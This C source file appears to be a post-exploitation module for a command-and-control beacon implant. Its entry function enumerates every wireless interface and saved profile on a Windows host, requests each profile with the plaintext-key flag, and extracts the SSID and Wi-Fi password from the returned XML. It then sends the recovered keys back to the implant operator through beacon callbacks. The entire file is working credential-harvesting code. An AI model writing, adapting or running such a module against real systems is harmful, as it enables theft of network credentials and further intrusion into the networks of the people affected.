/*
 * wifi - list wireless profiles and recover plaintext keys where permitted.
 */
#include "beacon.h"
#include "bofdefs.h"
#include "helpers.h"

static const wchar_t *wstrstr(const wchar_t *hay, const wchar_t *needle)
{
    int n = bof_wcslen(needle);
    if (!n) return hay;
    while (*hay) {
        int i;
        for (i = 0; i < n && hay[i]; i++)
            if (hay[i] != needle[i]) break;
        if (i == n) return hay;
        hay++;
    }
    return NULL;
}

static int xml_value(const wchar_t *xml, const wchar_t *tag, char *out, int outsz)
{
    wchar_t open[64], close[64];
    const wchar_t *p, *e;
    int i, n;

    open[0] = L'<';
    for (i = 0; tag[i] && i < 60; i++) open[i + 1] = tag[i];
    open[i + 1] = L'>';
    open[i + 2] = 0;

    close[0] = L'<'; close[1] = L'/';
    for (i = 0; tag[i] && i < 60; i++) close[i + 2] = tag[i];
    close[i + 2] = L'>';
    close[i + 3] = 0;

    p = wstrstr(xml, open);
    if (!p) return 0;
    p += bof_wcslen(open);
    e = wstrstr(p, close);
    if (!e) return 0;
    n = (int)(e - p);
    if (n >= outsz) n = outsz - 1;
    for (i = 0; i < n; i++) out[i] = (char)p[i];
    out[n] = 0;
    return 1;
}

void go(char *args, int alen)
{
    HANDLE client = NULL;
    DWORD negotiated = 0, rc;
    PWLAN_INTERFACE_INFO_LIST list = NULL;
    DWORD i;
    (void)args; (void)alen;

    rc = WLANAPI$WlanOpenHandle(2, NULL, &negotiated, &client);
    if (rc != ERROR_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR, "WlanOpenHandle failed: %lu\n", (unsigned long)rc);
        return;
    }

    rc = WLANAPI$WlanEnumInterfaces(client, NULL, &list);
    if (rc != ERROR_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR, "WlanEnumInterfaces failed: %lu\n", (unsigned long)rc);
        WLANAPI$WlanCloseHandle(client, NULL);
        return;
    }

    for (i = 0; i < list->dwNumberOfItems; i++) {
        PWLAN_INTERFACE_INFO ii = &list->InterfaceInfo[i];
        PWLAN_PROFILE_INFO_LIST profiles = NULL;
        DWORD j;
        char desc[256];

        bof_w2a(ii->strInterfaceDescription, desc, sizeof(desc));
        BeaconPrintf(CALLBACK_OUTPUT, "\n[Interface] %s\n", desc);

        if (WLANAPI$WlanGetProfileList(client, &ii->InterfaceGuid, NULL, &profiles) != ERROR_SUCCESS) {
            BeaconPrintf(CALLBACK_OUTPUT, "  (unable to list profiles)\n");
            continue;
        }

        for (j = 0; j < profiles->dwNumberOfItems; j++) {
            LPWSTR xml = NULL;
            DWORD flags = WLAN_PROFILE_GET_PLAINTEXT_KEY;
            DWORD granted = 0;
            char ssid[256] = "?";
            char key[256] = "";

            rc = WLANAPI$WlanGetProfile(client, &ii->InterfaceGuid,
                                        profiles->ProfileInfo[j].strProfileName,
                                        NULL, &xml, &flags, &granted);
            if (rc != ERROR_SUCCESS || !xml) {
                BeaconPrintf(CALLBACK_OUTPUT, "  - %ls (error %lu)\n",
                             profiles->ProfileInfo[j].strProfileName, (unsigned long)rc);
                continue;
            }

            xml_value(xml, L"name", ssid, sizeof(ssid));
            if (!xml_value(xml, L"keyMaterial", key, sizeof(key)))
                bof_strcpy(key, "(unavailable)");

            BeaconPrintf(CALLBACK_OUTPUT, "  - SSID: %s\n    Key : %s\n", ssid, key);
            WLANAPI$WlanFreeMemory(xml);
        }

        WLANAPI$WlanFreeMemory(profiles);
    }

    WLANAPI$WlanFreeMemory(list);
    WLANAPI$WlanCloseHandle(client, NULL);
}
